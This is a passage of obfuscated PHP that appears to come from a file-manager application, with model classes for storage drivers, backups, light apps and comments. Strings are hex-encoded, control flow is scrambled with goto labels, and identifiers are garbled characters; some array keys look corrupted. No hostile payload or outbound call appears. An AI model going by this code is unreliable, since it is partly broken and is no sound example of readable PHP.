($cô®¦×Ø»Ü != $eº÷ƒ¼âÄ[$B­²èÅ¼²ë[28]]) { $AøŠ„ó¿¢->rename($eÕÄîÅË°÷, $cô®¦×Ø»Ü); } $AøŠ„ó¿¢->where($EÑÕœÔ°»)->setField($B­²èÅ¼²ë[393], 0); $FËÍ‰”ùè->eventRecycle($eÕÄîÅË°÷, $B­²èÅ¼²ë[2326]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\x73\x74\x6f\162\x61\147\145\x4c\151\x73\164"; public $field = array("\156\141\155\x65", "\x73\x69\x7a\x65\x4d\141\170", "\163\171\x73\164\x65\x6d", "\x64\x65\146\141\x75\x6c\x74", "\x64\162\151\166\145\x72", "\143\157\x6e\146\151\x67"); public function listData($a¦–óé‹ÂË = false, $A‘Ä—Ú¨‰Û = "\x6d\157\x64\151\146\x79\124\x69\x6d\145", $BÏÓºƒİÊ£ = false) { goto dë Ãîãï¤; Aè”ÃÍï¬: return $D“¼£óé; goto A†‘¨ÔœŠ; bÜåÕ÷‘Ùô: foreach ($D“¼£óé as $c‡ãĞ‰ÖÊä => $aå¦¿Æ“Ò¨) { unset($D“¼£óé[$c‡ãĞ‰ÖÊä][$C·¼÷Æ•[6]]); $D“¼£óé[$c‡ãĞ‰ÖÊä][$C·¼÷Æ•[2061]] = 0; } $EíôˆØÅ“Š = array_to_keyvalue($D“¼£óé, $C·¼÷Æ•[33], $C·¼÷Æ•[364]); $this->_listAppendSize($D“¼£óé, $EíôˆØÅ“Š); goto Aè”ÃÍï¬; dë Ãîãï¤: $C·¼÷Æ• =& $_SERVER[¢à]; $D“¼£óé = parent::listData($a¦–óé‹ÂË, $A‘Ä—Ú¨‰Û, $BÏÓºƒİÊ£); if ($a¦–óé‹ÂË) { return $D“¼£óé; } goto bÜåÕ÷‘Ùô; A†‘¨ÔœŠ: } public function _listAppendSize(&$eµ÷¢àĞØƒ, $dòœ‰‰·ñ×) { $a”†²õ„…ç =& $_SERVER[¢à]; $f·¾±°ó·À = $a”†²õ„…ç[2327] . implode($a”†²õ„…ç[47], $dòœ‰‰·ñ×) . $a”†²õ„…ç[2328]; $CÇ¾¨œ‹ƒ¨ = Model($a”†²õ„…ç[719])->query($f·¾±°ó·À); $CÇ¾¨œ‹ƒ¨ = array_to_keyvalue($CÇ¾¨œ‹ƒ¨, $a”†²õ„…ç[364], $a”†²õ„…ç[77]); foreach ($eµ÷¢àĞØƒ as $aô‡©àá => $dàáâ¸ğŞË) { $eµ÷¢àĞØƒ[$aô‡©àá][$a”†²õ„…ç[2061]] = isset($CÇ¾¨œ‹ƒ¨[$dàáâ¸ğŞË[$a”†²õ„…ç[364]]]) ? $CÇ¾¨œ‹ƒ¨[$dàáâ¸ğŞË[$a”†²õ„…ç[364]]] : 0; } } public function getConfig($A¤ÒªÙñëÃ) { $b•ÜÓ¶Âï„ = parent::listData($A¤ÒªÙñëÃ); return json_decode($b•ÜÓ¶Âï„[$_SERVER[¢à][6]], !0); } public function update($E®¦ÏÎ¨ÎÅ, $d´™•ùÍœà) { goto c¶âœ…†Æ¹; B¾ÎÕƒ·Ò–: if (isset($A¼åÔÆ†¯[$AÏêÚ—ß]) && $A¼åÔÆ†¯[$AÏêÚ—ß][$e…ñ¼…øª[364]] != $E®¦ÏÎ¨ÎÅ) { return !1; } if (isset($d´™•ùÍœà[$e…ñ¼…øª[2329]]) && $d´™•ùÍœà[$e…ñ¼…øª[2329]] == $e…ñ¼…øª[83]) { $this->checkConfig($d´™•ùÍœà); } unset($d´™•ùÍœà[$e…ñ¼…øª[2329]]); goto DÉİ¯œ§Ç«; c¶âœ…†Æ¹: $e…ñ¼…øª =& $_SERVER[¢à]; $AÏêÚ—ß = $d´™•ùÍœà[$e…ñ¼…øª[28]]; $A¼åÔÆ†¯ = array_to_keyvalue(parent::listData(), $e…ñ¼…øª[28]); goto B¾ÎÕƒ·Ò–; DÉİ¯œ§Ç«: $bÎŸÓÚ®‰ = parent::update($E®¦ÏÎ¨ÎÅ, $d´™•ùÍœà); if ($bÎŸÓÚ®‰ && $d´™•ùÍœà[$e…ñ¼…øª[34]]) { foreach ($A¼åÔÆ†¯ as $FƒÒÅâ†ºÚ) { if ($FƒÒÅâ†ºÚ[$e…ñ¼…øª[34]] && $FƒÒÅâ†ºÚ[$e…ñ¼…øª[364]] != $E®¦ÏÎ¨ÎÅ) { parent::update($FƒÒÅâ†ºÚ[$e…ñ¼…øª[364]], array($e…ñ¼…øª[34] => 0)); } } } return $bÎŸÓÚ®‰; goto f÷““¤; f÷““¤: } public function add($dæÆáí„£Ñ) { goto A„âˆŠåÛ; A„âˆŠåÛ: $B†í¹Á™¢æ =& $_SERVER[¢à]; $D²ë¬Óîê = array_to_keyvalue(parent::listData(), $B†í¹Á™¢æ[28]); if (isset($D²ë¬Óîê[$dæÆáí„£Ñ[$B†í¹Á™¢æ[28]]])) { return !1; } goto CÙ’Ÿ¤ÅÏŞ; Fíàù„åÕ: return $a„Á†ºÀ; goto cñÅñ®¤àï; CÙ’Ÿ¤ÅÏŞ: $this->checkConfig($dæÆáí„£Ñ); $a„Á†ºÀ = parent::insert($dæÆáí„£Ñ); if ($a„Á†ºÀ && $dæÆáí„£Ñ[$B†í¹Á™¢æ[34]]) { foreach ($D²ë¬Óîê as $f®¯â†­Œ) { if ($f®¯â†­Œ[$B†í¹Á™¢æ[34]]) { parent::update($f®¯â†­Œ[$B†í¹Á™¢æ[364]], array($B†í¹Á™¢æ[34] => 0)); } } } goto Fíàù„åÕ; cñÅñ®¤àï: } public function checkConfig(&$Eù‰»Û õˆ) { goto dË»´Ñ—; C‰Ş„„ñøŒ: $Eù‰»Û õˆ[$B”ºìéÀ•°[6]] = json_encode($bòßò©ó¥ƒ); $Eù‰»Û õˆ[$B”ºìéÀ•°[90]] = $dÛ¶°‡ø³÷; return !0; goto a‹İ˜Ò¬ù·; Cµİ“è³ôÌ: $fç÷¾½¡È = $cÅª‘Æ¡§ï->getPath($dÑİÀòÅññ . $B”ºìéÀ•°[1957]); if (!$cÅª‘Æ¡§ï->mkfile($fç÷¾½¡È)) { show_json(LNG($B”ºìéÀ•°[2330]), !1); } $bòßò©ó¥ƒ[$B”ºìéÀ•°[1020]] = $dÑİÀòÅññ; goto C‰Ş„„ñøŒ; AêŒ«šÄÂ‡: foreach ($bòßò©ó¥ƒ as $Fá˜±à—¶“ => $b¡¸³É„Ùœ) { $bòßò©ó¥ƒ[$Fá˜±à—¶“] = trim($b¡¸³É„Ùœ); } $dÑİÀòÅññ = rtrim($bòßò©ó¥ƒ[$B”ºìéÀ•°[1020]], $B”ºìéÀ•°[8]) . $B”ºìéÀ•°[8]; $dÛ¶°‡ø³÷ = $this->driverType($DËƒë´İ›§); goto Eô¿è—Û; Eô¿è—Û: $Bß²ÏùšÜ = $B”ºìéÀ•°[71] . $dÛ¶°‡ø³÷; $cÅª‘Æ¡§ï = new $Bß²ÏùšÜ($bòßò©ó¥ƒ); if (in_array($DËƒë´İ›§, $cÅª‘Æ¡§ï->objectDriver)) { if (!$cÅª‘Æ¡§ï->isBucketCors() && !$cÅª‘Æ¡§ï->setBucketCors()) { $fæ‰æîªàã = LNG($B”ºìéÀ•°[2330]); $fæ‰æîªàã .= $B”ºìéÀ•°[2331] . LNG($B”ºìéÀ•°[2332]); show_json($fæ‰æîªàã, !1); } } goto Cµİ“è³ôÌ; dË»´Ñ—: $B”ºìéÀ•° =& $_SERVER[¢à]; $DËƒë´İ›§ = strtolower($Eù‰»Û õˆ[$B”ºìéÀ•°[90]]); $bòßò©ó¥ƒ = json_decode_force($Eù‰»Û õˆ[$B”ºìéÀ•°[6]]); goto AêŒ«šÄÂ‡; a‹İ˜Ò¬ù·: } private function driverType($fØÒçâˆŞ) { $aã¼ÓÈŞ³ =& $_SERVER[¢à]; $DÕ¼Šƒ‹¯£ = array($aã¼ÓÈŞ³[103] => $aã¼ÓÈŞ³[2333], $aã¼ÓÈŞ³[58] => $aã¼ÓÈŞ³[2334], $aã¼ÓÈŞ³[64] => $aã¼ÓÈŞ³[2335]); if (isset($DÕ¼Šƒ‹¯£[$fØÒçâˆŞ])) { return $DÕ¼Šƒ‹¯£[$fØÒçâˆŞ]; } return strtoupper($fØÒçâˆŞ); } public function driverListSystem() { $FÌ¨·Ì²İì =& $_SERVER[¢à]; $A³¹‘à§‡İ = parent::listData(); $DùŠ¶À•™æ = array(); foreach ($A³¹‘à§‡İ as $aÉ¤‘·¾«) { unset($aÉ¤‘·¾«[$FÌ¨·Ì²İì[184]], $aÉ¤‘·¾«[$FÌ¨·Ì²İì[107]]); $aÉ¤‘·¾«[$FÌ¨·Ì²İì[6]] = json_decode_force($aÉ¤‘·¾«[$FÌ¨·Ì²İì[6]]); $DùŠ¶À•™æ[] = $aÉ¤‘·¾«; } return $DùŠ¶À•™æ; } public function defaultDriver() { $d¦ÇÉğ¬Éø =& $_SERVER[¢à]; $Eë‚¤‘Üí£ = parent::listData(); $Cˆ »“ÆÄ‘ = array_filter_by_field($Eë‚¤‘Üí£, $d¦ÇÉğ¬Éø[34], 1); $Cˆ »“ÆÄ‘ = $Cˆ »“ÆÄ‘[0]; if ($Cˆ »“ÆÄ‘) { $Cˆ »“ÆÄ‘[$d¦ÇÉğ¬Éø[6]] = json_decode($Cˆ »“ÆÄ‘[$d¦ÇÉğ¬Éø[6]], !0); } return $Cˆ »“ÆÄ‘; } public function driverInfo($D²œğ¸¹¥¬) { $Cè¤’•ç =& $_SERVER[¢à]; $F¿ºÔÖ–¾„ = array_to_keyvalue(parent::listData(), $Cè¤’•ç[364]); if (!isset($F¿ºÔÖ–¾„[$D²œğ¸¹¥¬])) { return !1; } $d‘Ğ’©Ô´˜ = $F¿ºÔÖ–¾„[$D²œğ¸¹¥¬]; $d‘Ğ’©Ô´˜[$Cè¤’•ç[6]] = json_decode_force($d‘Ğ’©Ô´˜[$Cè¤’•ç[6]]); return $d‘Ğ’©Ô´˜; } public function removeWithFile($c’è®¡Âœ¢) { goto E¯ƒÌª·Á; C£ÊÑ¡±Ñ°: $B±¯ä­ˆ¾ = Model($F‘°ä“ß¤æ[418])->where($C­Š÷áÜİ)->sum($F‘°ä“ß¤æ[77]); $Fˆ•‘ÀÑ®õ = $F‘°ä“ß¤æ[2336] . $c’è®¡Âœ¢; $FŞ›ÍÕ§œ¼ = new TaskFileTransfer($Fˆ•‘ÀÑ®õ, $F‘°ä“ß¤æ[2337], $Dš³³òõ±ƒ, LNG($F‘°ä“ß¤æ[2338]) . "\x28{$c’è®¡Âœ¢}\51"); goto EœÎ‘ØÔßÜ; E¯ƒÌª·Á: $F‘°ä“ß¤æ =& $_SERVER[¢à]; $C­Š÷áÜİ = array($F‘°ä“ß¤æ[743] => $c’è®¡Âœ¢); $Dš³³òõ±ƒ = Model($F‘°ä“ß¤æ[418])->where($C­Š÷áÜİ)->count(); goto C£ÊÑ¡±Ñ°; aÔÙš—Âˆ‰: $DĞØ†Ê‘çÈ = "\x7b\151\157\x3a{$FËæéõˆ«’}\175\x2f"; $Cç¸“©ƒ½ = !0; $B¤­Éº„²¦ = array(); goto bô°çôÌËÆ; DÉ…Ã…Ü»: if (!$Cç¸“©ƒ½) { $FŞ›ÍÕ§œ¼->stop($Fˆ•‘ÀÑ®õ); return !1; } $FŞ›ÍÕ§œ¼->end(); return parent::remove($c’è®¡Âœ¢); goto C‚×ÇÒØèØ; bô°çôÌËÆ: $bãïğÕİ­ = Model($F‘°ä“ß¤æ[164])->where($C­Š÷áÜİ)->field($F‘°ä“ß¤æ[2339])->select(); foreach ($bãïğÕİ­ as $FÂÁ‘ÓöÑ†) { goto Dãš‰ÇÅè; b£â·‘³é: if (IO::exist($dŸªçÉ‡©­)) { $FŞ›ÍÕ§œ¼->updateFileEnd($FÂÁ‘ÓöÑ†[$F‘°ä“ß¤æ[28]], $FÂÁ‘ÓöÑ†[$F‘°ä“ß¤æ[77]]); continue; } if (!IO::move($a§Ğ÷¬å, get_path_father($dŸªçÉ‡©­))) { $Cç¸“©ƒ½ = !1; break; } $C­Š÷áÜİ = array($F‘°ä“ß¤æ[415] => $FÂÁ‘ÓöÑ†[$F‘°ä“ß¤æ[415]]); goto CóÈà¿¼“„; Dãš‰ÇÅè: $a§Ğ÷¬å = $FÂÁ‘ÓöÑ†[$F‘°ä“ß¤æ[75]]; $dŸªçÉ‡©­ = $DĞØ†Ê‘çÈ . str_replace("\173\151\157\72{$c’è®¡Âœ¢}\x7d\x2f", $F‘°ä“ß¤æ[33], $a§Ğ÷¬å); if (!IO::exist($a§Ğ÷¬å)) { $B¤­Éº„²¦[] = $FÂÁ‘ÓöÑ†[$F‘°ä“ß¤æ[415]]; $FŞ›ÍÕ§œ¼->updateFileEnd($FÂÁ‘ÓöÑ†[$F‘°ä“ß¤æ[28]], $FÂÁ‘ÓöÑ†[$F‘°ä“ß¤æ[77]]); continue; } goto b£â·‘³é; CóÈà¿¼“„: $DòÑáë›‹ = array($F‘°ä“ß¤æ[743] => $FËæéõˆ«’, $F‘°ä“ß¤æ[75] => $dŸªçÉ‡©­); Model($F‘°ä“ß¤æ[164])->where($C­Š÷áÜİ)->save($DòÑáë›‹); goto B•õš¹†‰; B•õš¹†‰: } $this->removeByFileID($B¤­Éº„²¦); goto DÉ…Ã…Ü»; EœÎ‘ØÔßÜ: $FŞ›ÍÕ§œ¼->task[$F‘°ä“ß¤æ[698]] = (double) $B±¯ä­ˆ¾; $C°ÂÉÃøŒÃ = KodIO::defaultDriver(); $FËæéõˆ«’ = $C°ÂÉÃøŒÃ[$F‘°ä“ß¤æ[364]]; goto aÔÙš—Âˆ‰; C‚×ÇÒØèØ: } public function progress($C’ÇÈì­°ª) { return Task::get($_SERVER[¢à][2336] . $C’ÇÈì­°ª); } private function removeByFileID($BØ‹´¥÷¬Ç = array()) { goto CÊ¢·ÎƒÆ; e„ï”†æå: $fğãßÈªŸ¢ = Model($EÄ”Åàù…„[1106])->where($d÷ô…‰¶¶é)->field($EÄ”Åàù…„[366])->select(); if (!$fğãßÈªŸ¢) { return; } $fğãßÈªŸ¢ = array_to_keyvalue($fğãßÈªŸ¢, $EÄ”Åàù…„[33], $EÄ”Åàù…„[366]); goto f‚‰‚¤…°; CÊ¢·ÎƒÆ: $EÄ”Åàù…„ =& $_SERVER[¢à]; if (empty($BØ‹´¥÷¬Ç)) { return; } $d÷ô…‰¶¶é = array($EÄ”Åàù…„[415] => array($EÄ”Åàù…„[7], $BØ‹´¥÷¬Ç)); goto e„ï”†æå; f‚‰‚¤…°: foreach ($fğãßÈªŸ¢ as $FÖ§Ÿ ©) { Model($EÄ”Åàù…„[379])->removeNow($FÖ§Ÿ ©, !1); } goto FË«„Ô¨¬; FË«„Ô¨¬: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\x4c\x69\x67\150\164\101\160\x70"; public $modelType = "\x53\171\163\164\x65\x6d\x4f\160\164\151\x6f\156"; public $field = array("\x6e\x61\x6d\145", "\147\x72\x6f\x75\160", "\x64\145\x73\143", "\x63\157\x6e\164\145\156\x74"); public function listData($A«ŞáåÄ¾¶ = false, $Bù¯ˆìƒéà = "\155\157\x64\151\x66\x79\124\x69\155\145", $E¾èƒ½†Ÿº = true) { return parent::listData($A«ŞáåÄ¾¶, $Bù¯ˆìƒéà, $E¾èƒ½†Ÿº); } public function remove($F˜ÅåÔÁâè) { $B†â´ª°ì¶ = $this->findByName($F˜ÅåÔÁâè); if (!$B†â´ª°ì¶) { return !1; } return parent::remove($B†â´ª°ì¶[$_SERVER[¢à][364]]); } public function add($bÂô“à‚ö­) { if ($this->findByName($bÂô“à‚ö­[$_SERVER[¢à][28]])) { return !1; } return parent::insert($bÂô“à‚ö­); } public function update($fãÚÁ¬³¡Ò, $B«ÚÕª˜ÎŸ) { $DïÕŒÌçÅ™ =& $_SERVER[¢à]; $bâñµõ“„í = $this->findByName($fãÚÁ¬³¡Ò); $d‰â«´¿  = $this->findByName($B«ÚÕª˜ÎŸ[$DïÕŒÌçÅ™[28]]); if (!$bâñµõ“„í || $d‰â«´¿  && $d‰â«´¿ [$DïÕŒÌçÅ™[364]] != $bâñµõ“„í[$DïÕŒÌçÅ™[364]]) { return !1; } return parent::update($bâñµõ“„í[$DïÕŒÌçÅ™[364]], $B«ÚÕª˜ÎŸ); } } goto B®äÄğÂ Š; fÕ‡¨²÷ ¼: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\x62\x61\143\153\x75\160\114\x69\163\164"; public $field = array("\151\157", "\156\x61\155\x65", "\163\x74\x61\164\165\x73", "\143\157\x6e\164\x65\x6e\x74", "\x72\x65\x73\165\154\164", "\x74\x69\x6d\145\x46\162\x6f\x6d", "\x74\151\x6d\145\x54\x6f"); public function config() { goto bªªÚ —Í; bªªÚ —Í: $eç™²²‡âÕ =& $_SERVER[¢à]; $cÚ“ËøèÅ¨ = Model($eç™²²‡âÕ[1084])->get($eç™²²‡âÕ[712]); $cÚ“ËøèÅ¨ = json_decode($cÚ“ËøèÅ¨, !0); goto f¾ëÚœ¨Ğ†; eÇô‚¤á‰”: if (isset($Aá“©»Ş§[$eç™²²‡âÕ[187]])) { $Aá“©»Ş§[$eç™²²‡âÕ[187]] = json_decode($Aá“©»Ş§[$eç™²²‡âÕ[187]], !0); } if (isset($cÚ“ËøèÅ¨[$eç™²²‡âÕ[187]])) { $Aá“©»Ş§[$eç™²²‡âÕ[187]][$eç™²²‡âÕ[1387]] = $cÚ“ËøèÅ¨[$eç™²²‡âÕ[187]]; unset($cÚ“ËøèÅ¨[$eç™²²‡âÕ[187]]); } return array_merge($Aá“©»Ş§, $cÚ“ËøèÅ¨); goto dÜíÍ÷¡§; d„ŠíÁÁÓ‘: Action($eç™²²‡âÕ[2097])->taskInit(); $f“õÑÄ = Model($eç™²²‡âÕ[2098])->listData(); foreach ($f“õÑÄ as $FÎ‘­£ª©ù) { if ($FÎ‘­£ª©ù[$eç™²²‡âÕ[1076]] == $eç™²²‡âÕ[83] && $FÎ‘­£ª©ù[$eç™²²‡âÕ[1400]] == $eç™²²‡âÕ[2099]) { $Aá“©»Ş§ = $FÎ‘­£ª©ù; break; } } goto eÇô‚¤á‰”; f¾ëÚœ¨Ğ†: $cÚ“ËøèÅ¨ = is_array($cÚ“ËøèÅ¨) ? $cÚ“ËøèÅ¨ : array(); if (!isset($cÚ“ËøèÅ¨[$eç™²²‡âÕ[692]])) { $cÚ“ËøèÅ¨[$eç™²²‡âÕ[692]] = $eç™²²‡âÕ[464]; } $Aá“©»Ş§ = array(); goto d„ŠíÁÁÓ‘; dÜíÍ÷¡§: } public function listData($bÎ©ÓîÙ¢á = false, $c›±ªƒ„ª„ = "\155\157\144\x69\x66\x79\124\151\x6d\x65", $BëÙ›ï—…Ğ = false) { return parent::listData($bÎ©ÓîÙ¢á, $c›±ªƒ„ª„, !0); } public function lastItem() { $cÑ“ßÍ¿¥ò = $this->listData(); return !empty($cÑ“ßÍ¿¥ò[0]) ? $cÑ“ßÍ¿¥ò[0] : null; } public function kill($D Ø°ÏŠí‡) { goto fë‡é¬‡‡ç; cÖëÃ‡Óñ: return $this->remove($D Ø°ÏŠí‡); goto A«•Û›ùš; c…•Ï‹Üó‹: $DõÅ®Ï£…¨ = $F‹·¼ßâ×„[$eÒ“‡ ÔÛƒ[28]]; $C‹“ïµ‹× = TEMP_FILES . $eÒ“‡ ÔÛƒ[710] . $DõÅ®Ï£…¨ . $eÒ“‡ ÔÛƒ[8]; IO::remove($C‹“ïµ‹×, !1); goto cÖëÃ‡Óñ; fë‡é¬‡‡ç: $eÒ“‡ ÔÛƒ =& $_SERVER[¢à]; $F‹·¼ßâ×„ = $this->listData($D Ø°ÏŠí‡); if (!$F‹·¼ßâ×„ || empty($F‹·¼ßâ×„[$eÒ“‡ ÔÛƒ[28]])) { return !0; } goto fŞ‹ÔÙÂ; fŞ‹ÔÙÂ: Task::kill($eÒ“‡ ÔÛƒ[711]); Task::kill($eÒ“‡ ÔÛƒ[729]); Task::kill($eÒ“‡ ÔÛƒ[736]); goto c…•Ï‹Üó‹; A«•Û›ùš: } public function remove($FÓ±…›ˆÎÇ) { $fËŸ‚íÜÎ¸ = $this->listData($FÓ±…›ˆÎÇ); if (!$fËŸ‚íÜÎ¸) { return !0; } return $this->backupRemove($fËŸ‚íÜÎ¸); } private function backupRemove($FÓóÅ¬òœË) { $B¶”Ä§Éù¤ =& $_SERVER[¢à]; parent::remove($FÓóÅ¬òœË[$B¶”Ä§Éù¤[364]]); $B½æñ¶­ò = "\173\151\157\x3a{$FÓóÅ¬òœË[$B¶”Ä§Éù¤[691]]}\x7d\57\144\x61\164\x61\142\x61\163\x65\57\x62\x61\x63\153\165\x70\137" . $FÓóÅ¬òœË[$B¶”Ä§Éù¤[28]]; IO::remove($B½æñ¶­ò, !1); return !0; } public function start() { goto fÂ ÃáÑÃŸ; DïÔ Ö”¥: $A×éó¤Ìß† = new Backup(); $A×éó¤Ìß†->keep(); if (!$A×éó¤Ìß†->db()) { return !1; } goto aŠì¹ÎÂäÃ; aŠì¹ÎÂäÃ: if (!$A×éó¤Ìß†->dbFile()) { return !1; } if ($e„µÃ²îÛÈ[$aÕİ¿ô§Œ†[692]] == $aÕİ¿ô§Œ†[464]) { $A×éó¤Ìß†->file(); } Backup::set(array($aÕİ¿ô§Œ†[689] => 1, $aÕİ¿ô§Œ†[703] => time())); goto eêØ×‚¶œ™; A„„æ¼óº: if (!$e„µÃ²îÛÈ || $e„µÃ²îÛÈ[$aÕİ¿ô§Œ†[1384]] != $aÕİ¿ô§Œ†[83]) { return !1; } $eÒœ‚¬Ú«• = $this->process(); foreach ($eÒœ‚¬Ú«• as $c šáô‡·Á) { if ($c šáô‡·Á) { return Task::restart($c šáô‡·Á[$aÕİ¿ô§Œ†[364]]); } } goto DïÔ Ö”¥; fÂ ÃáÑÃŸ: $aÕİ¿ô§Œ† =& $_SERVER[¢à]; if ($GLOBALS[$aÕİ¿ô§Œ†[6]][$aÕİ¿ô§Œ†[84]][$aÕİ¿ô§Œ†[2100]] != $aÕİ¿ô§Œ†[83]) { return !0; } $e„µÃ²îÛÈ = $this->config(); goto A„„æ¼óº; eêØ×‚¶œ™: return !0; goto f’…»¸Š‡Ü; f’…»¸Š‡Ü: } public function process() { $Fªƒ¹Î—Í• =& $_SERVER[¢à]; return array($Fªƒ¹Î—Í•[694] => Task::get($Fªƒ¹Î—Í•[711]), $Fªƒ¹Î—Í•[697] => Task::get($Fªƒ¹Î—Í•[729]), $Fªƒ¹Î—Í•[164] => Task::get($Fªƒ¹Î—Í•[736])); } public function restore() { $B³†­İì¤» =& $_SERVER[¢à]; ActionCall($B³†­İì¤»[2101], !0, 1); ActionCall($B³†­İì¤»[2101], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\145\156\x74"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\x61\155\145" => "\x63\157\155\155\145\x6e\164\137\x6d\145\x74\x61", "\x6d\145\x74\141\106\151\145\x6c\x64" => "\x63\x6f\155\155\145\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($a‰è¤äŠèÁ) { $A°òÔ›– =& $_SERVER[¢à]; if ($a‰è¤äŠèÁ[$A°òÔ›–[2102]]) { $dñ¸ğÚ‰£« = $this->where(array($A°òÔ›–[2103] => $a‰è¤äŠèÁ[$A°òÔ›–[2102]]))->find(); if (!$dñ¸ğÚ‰£« || $dñ¸ğÚ‰£«[$A°òÔ›–[368]] != $a‰è¤äŠèÁ[$A°òÔ›–[368]] || $dñ¸ğÚ‰£«[$A°òÔ›–[452]] != $a‰è¤äŠèÁ[$A°òÔ›–[452]]) { return !1; } $this->where(array($A°òÔ›–[2103] => $a‰è¤äŠèÁ[$A°òÔ›–[2102]]))->setAdd($A°òÔ›–[2104], 1); } return $this->add($a‰è¤äŠèÁ); } public function remove($F‘½½Ó’) { $Eë£…§åó =& $_SERVER[¢à]; $E–ÖÍ‹ºñ¿ = array($Eë£…§åó[2103] => $F‘½½Ó’); $b™¹Û‹¶ = $this->where($E–ÖÍ‹ºñ¿)->find(); if ($b™¹Û‹¶[$Eë£…§åó[2102]]) { $this->where(array($Eë£…§åó[2103] => $b™¹Û‹¶[$Eë£…§åó[2102]]))->setAdd($Eë£…§åó[2104], -1); } return $this->where($E–ÖÍ‹ºñ¿)->delete(); } public function edit($aÍ°•²¹, $c‹É®…ì×Ğ) { $dìÒÆ×Ú  =& $_SERVER[¢à]; $B‚ÓØ½¼Üæ = array($dìÒÆ×Ú [2103] => $aÍ°•²¹); return $this->where($B‚ÓØ½¼Üæ)->save(array($dìÒÆ×Ú [2105] => $c‹É®…ì×Ğ)); } public function prasise($F¼„˜ô†¬Æ) { $C¹ÆÌ½äªÕ =& $_SERVER[¢à]; $BËÛ‹Ë £Å = Model($C¹ÆÌ½äªÕ[2106]); $dÃŸ½òéÏÀ = array($C¹ÆÌ½äªÕ[2103] => $F¼„˜ô†¬Æ, $C¹ÆÌ½äªÕ[1403] => USER_ID); $B‡’èÓ ¡ = $BËÛ‹Ë £Å->where($dÃŸ½òéÏÀ)->find(); if (!$B‡’èÓ ¡) { $BËÛ‹Ë £Å->add($dÃŸ½òéÏÀ); $b»à¡–ÀÅ× = $this->where(array($C¹ÆÌ½äªÕ[2103] => $F¼„˜ô†¬Æ))->setAdd($C¹ÆÌ½äªÕ[2107], 1); } else { $BËÛ‹Ë £Å->where($dÃŸ½òéÏÀ)->delete(); $b»à¡–ÀÅ× = $this->where(array($C¹ÆÌ½äªÕ[2103] => $F¼„˜ô†¬Æ))->setAdd($C¹ÆÌ½äªÕ[2107], -1); } return $b»à¡–ÀÅ×; } public function targetInfo($Fåœ‚†ËÈ, $eŞ£ˆº÷ù) { goto e®†ÓÊ¼«; e®†ÓÊ¼«: $F…¿ä¤‰Ññ =& $_SERVER[¢à]; $d›±‰ßøÜ = array($F…¿ä¤‰Ññ[517] => $Fåœ‚†ËÈ, $F…¿ä¤‰Ññ[518] => $eŞ£ˆº÷ù); $F‚•äÄ¾ÊÃ = $this->where($d›±‰ßøÜ)->count(); goto A¥Ÿ™†í‚ê; A¥Ÿ™†í‚ê: $cò†ÒŠ±š = "\x52\111\107\x48\124\40\112\117\x49\116\x20{$this->tablePrefix}\x63\157\155\x6d\x65\x6e\x74\137\160\162\x61\151\x73\x65\x20\163\164\141\x72\x20\157\156\x20\x63\157\x6d\x6d\145\156\x74\56\x63\157\x6d\155\x65\156\164\x49\104\40\x3d\40\163\x74\x61\x72\x2e\143\x6f\x6d\155\145\x6e\x74\111\x44"; $b×Œ‹‡Œš = $this->alias($F…¿ä¤‰Ññ[338])->where($d›±‰ßøÜ)->join($cò†ÒŠ±š, $F…¿ä¤‰Ññ[2108])->count(); $d†äÛÁáÃ³ = array($F…¿ä¤‰Ññ[2109] => $F‚•äÄ¾ÊÃ, $F…¿ä¤‰Ññ[2110] => $b×Œ‹‡Œš); goto dÁã¾¹àÃÏ; dÁã¾¹àÃÏ: return $d†äÛÁáÃ³; goto d¶³•½è§¢; d¶³•½è§¢: } public function listData($FÂ™«Ş¢‹º) { $d®›®˜¬„ =& $_SERVER[¢à]; if (isset($FÂ™«Ş¢‹º[$d®›®˜¬„[2111]])) { if ($FÂ™«Ş¢‹º[$d®›®˜¬„[2111]]) { $FÂ™«Ş¢‹º[$d®›®˜¬„[2112]] = array($d®›®˜¬„[926], intval($FÂ™«Ş¢‹º[$d®›®˜¬„[2111]])); } unset($FÂ™«Ş¢‹º[$d®›®˜¬„[2111]]); } if (isset($FÂ™«Ş¢‹º[$d®›®˜¬„[2113]])) { if ($FÂ™«Ş¢‹º[$d®›®˜¬„[2113]]) { $FÂ™«Ş¢‹º[$d®›®˜¬„[2112]] = array($d®›®˜¬„[923], intval($FÂ™«Ş¢‹º[$d®›®˜¬„[2113]])); } unset($FÂ™«Ş¢‹º[$d®›®˜¬„[2113]]); } return $this->_listData($FÂ™«Ş¢‹º); } private function _listData($AÎÑàŒ‰ö³) { $EÏ§÷ŞöÕ‹ =& $_SERVER[¢à]; $fŸ°ßÊ…Ãä = $this->where($AÎÑàŒ‰ö³)->_makeOrder()->selectPage(100); $this->_listAppendParent($fŸ°ßÊ…Ãä[$EÏ§÷ŞöÕ‹[351]]); $this->_listAppendUser($fŸ°ßÊ…Ãä[$EÏ§÷ŞöÕ‹[351]]); $this->_listAppendMeta($fŸ°ßÊ…Ãä[$EÏ§÷ŞöÕ‹[351]]); return $fŸ°ßÊ…Ãä; } private function _makeOrder() { $Aˆ­…“°‘š =& $_SERVER[¢à]; $d‰ê¹£à–ê = array($Aˆ­…“°‘š[2107], $Aˆ­…“°‘š[2104], $Aˆ­…“°‘š[184]); $a¶—ê£‘¤ë = Input::get($Aˆ­…“°‘š[403], $Aˆ­…“°‘š[7], $Aˆ­…“°‘š[386], $d‰ê¹£à–ê); $A—‹Øõà¹ = Input::get($Aˆ­…“°‘š[404], $Aˆ­…“°‘š[7], $Aˆ­…“°‘š[1405], array($Aˆ­…“°‘š[2114], $Aˆ­…“°‘š[401])); $E‚ã¤ì¿Ó = $a¶—ê£‘¤ë . $Aˆ­…“°‘š[50] . $A—‹Øõà¹; return $this->order($E‚ã¤ì¿Ó); } private function _listAppendParent(&$EÂ…Ï¸îë) { goto d²¹Â­æê; d²¹Â­æê: $D®¿”Ò“” =& $_SERVER[¢à]; 